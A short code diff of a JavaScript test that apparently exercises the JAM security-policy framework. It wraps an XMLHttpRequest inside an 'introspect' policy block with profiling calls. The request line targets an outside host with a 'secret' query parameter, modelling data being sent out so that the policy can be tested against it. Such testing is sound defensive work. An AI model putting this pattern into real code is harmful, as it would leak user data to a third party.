@@ -1,12 +1,9 @@
-var x = XMLHttpRequest();
 
-  JAM.startProfile('load');
-  introspect(JAM.policy.pFull) {
-  
-
-  }
-
-  JAM.stopProfile('load');
-
+JAM.startProfile('load');
+introspect(JAM.policy.pFull) {
 var x = XMLHttpRequest();
 x.open('GET', 'http://www.blackoutjack.com?secret=1');
+
+}
+
+JAM.stopProfile('load');
